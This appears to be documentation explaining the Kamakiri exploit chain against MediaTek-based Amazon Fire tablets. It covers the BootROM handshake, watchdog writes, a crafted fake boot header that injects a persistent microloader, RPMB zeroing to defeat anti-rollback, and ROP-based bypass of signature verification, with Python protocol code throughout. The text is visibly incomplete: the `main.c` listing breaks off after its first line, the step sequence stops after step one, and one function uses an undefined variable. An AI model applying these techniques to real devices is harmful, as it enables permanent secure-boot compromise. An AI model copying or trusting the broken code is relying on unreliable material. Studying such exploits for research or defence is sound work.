## Overview

Kamakiri is a multi-stage bootrom exploit for MediaTek devices that achieves arbitrary code execution through a USB control transfer vulnerability in the BootROM, then progressively gains deeper system access through custom payloads. The exploit chain consists of:

1. **BootROM exploitation** - Triggering a vulnerability via USB control transfer
2. **Stage 1 payload** - Initial code execution in BootROM context
3. **Stage 2 payload** - Full device access with eMMC read/write capabilities
4. **LK payload** - Persistent bootloader hook for ongoing modifications
5. **Microloader** - Automatic payload loading on every boot

<Note>
This exploit targets MediaTek MT8163/MT8173 chipsets commonly found in Amazon Fire tablets (codename "mantis").
</Note>

## The Exploit Chain

<Steps>

### Step 1: Handshake and Setup

The exploit begins by establishing communication with the device in BootROM mode using MediaTek's proprietary protocol:

```python
def handshake(self):
    # look for start byte
    while True:
        c = self._writeb(b'\xa0')
        if c == b'\x5f':
            self.dev.flushInput()
            self.dev.flushOutput()
            break
        self.dev.flushInput()
        self.dev.flushOutput()

    # complete sequence
    self.check(self._writeb(b'\x0a'), b'\xf5')
    self.check(self._writeb(b'\x50'), b'\xaf')
    self.check(self._writeb(b'\x05'), b'\xfa')
```

The handshake establishes a synchronized serial connection over USB with the MediaTek BootROM at 115200 baud.

**Key operations:**
- Disable hardware watchdog timer at `0x10007000`
- Write to watchdog register `0x10007050` to set up exploit conditions
- Read bootrom memory to verify device state

```python
dev.write32(0x10007000, 0x22000000)  # Disable watchdog
dev.write32(0x10007050, [0xA1000])   # Setup exploit condition
```

## Persistent Hook: LK Payload

The LK (Little Kernel) payload provides persistent control over the boot process. It's loaded by the microloader on every boot.

### Microloader Boot Flow

The microloader is injected into the boot partition using a crafted Android boot image header:

**Source: `microloader/inject_microloader.py`**

```python
# Craft fake Android boot header
hdr = b"ANDROID!"  # magic
hdr += struct.pack("<II", inject_sz, inject_addr - crafted_hdr_sz + page_size)
hdr += struct.pack("<IIIIIIII", 0, 0, 0, 0, 0, page_size, 0, 0)
```

The header exploits LK's boot image parser to execute injected code:

1. **ROP chain** - Return-oriented programming to bypass code signing
2. **Cache flush** - Ensures injected code is visible to CPU
3. **Payload load** - Reads LK payload from boot0 partition at offset `0x80000`

**Source: `microloader/main.c`**

```c
int main() {
```

## Security Bypasses

### RPMB Rollback Protection

The RPMB (Replay Protected Memory Block) is a secure eMMC partition that prevents firmware downgrade. Kamakiri bypasses this by:

1. Reading current RPMB state
2. Zeroing the entire RPMB partition
3. This resets the rollback counter, allowing downgrade

```python
log("Downgrade rpmb")
dev.rpmb_write(b"\x00" * 0x100)
log("Recheck rpmb")
rpmb = dev.rpmb_read()
if rpmb != b"\x00" * 0x100:
    dev.reboot()
    raise RuntimeError("downgrade failure, giving up")
```

<Warning>
**Security Impact:** Zeroing RPMB bypasses Android Verified Boot anti-rollback protection, allowing installation of vulnerable firmware versions.
</Warning>

### Secure Boot Bypass

By downgrading to vulnerable firmware versions and installing the persistent hook:

1. **Preloader** - Vulnerable version allows BootROM exploit
2. **TrustZone** - Downgraded version has weaker signature verification
3. **LK** - Patched at runtime to report device as unlocked
4. **Boot Images** - Modified via microloader injection

### Signature Verification

The microloader bypasses boot image signature verification through:

1. **ROP Exploitation** - Uses return-oriented programming in LK's address space
2. **Cache Manipulation** - Flushes instruction cache to ensure malicious code executes
3. **Function Hooking** - Redirects device read function to strip microloader header

## Communication Protocol

### Stage 1 & 2 Protocol

All commands use a simple TLV (Type-Length-Value) format:

```python
# Command format:
# [4 bytes] 0xf00dd00d - Magic
# [4 bytes] Command ID
# [variable] Command-specific data

def emmc_read(self, idx):
    self.dev.write(p32_be(0xf00dd00d))  # Magic
    self.dev.write(p32_be(0x1000))      # Command: Read
    self.dev.write(p32_be(idx))         # Block index
    data = self.dev.read(0x200)         # Receive 512 bytes
    return data
```

### BootROM Protocol

The BootROM uses MediaTek's proprietary protocol for memory access:

```python
def read32(self, addr, size=1):
    self.dev.write(b'\xd1')                    # Read command
    self.check(self.dev.read(1), b'\xd1')      # Echo
    
    self.dev.write(struct.pack('>I', addr))    # Address
    self.check_int(self.dev.read(4), addr)     # Echo
    
    self.dev.write(struct.pack('>I', size))    # Size
    self.check_int(self.dev.read(4), size)     # Echo
    
    self.check(self.dev.read(2), b'\x00\x00')  # Status
    
    for _ in range(size):
        data = struct.unpack('>I', self.dev.read(4))[0]
        result.append(data)
    
    self.check(self.dev.read(2), b'\x00\x00')  # Status
    return result
```

<Note>
All multi-byte values are **big-endian** in the BootROM protocol, but **little-endian** in the payload protocol.
</Note>

## Summary

The Kamakiri exploit chain demonstrates a complete system compromise:

1. **Initial Access** - USB control transfer vulnerability in BootROM
2. **Code Execution** - Stage 1 payload provides memory write primitive
3. **Device Access** - Stage 2 initializes eMMC for full storage access
4. **Security Bypass** - RPMB zeroing and firmware downgrade
5. **Persistence** - Microloader + LK payload survive reboots
6. **Complete Control** - Device unlocked, fastboot enabled, boot process controlled

The exploit leverages hardware vulnerabilities, firmware downgrades, and sophisticated code injection techniques to achieve permanent device compromise through the boot chain.
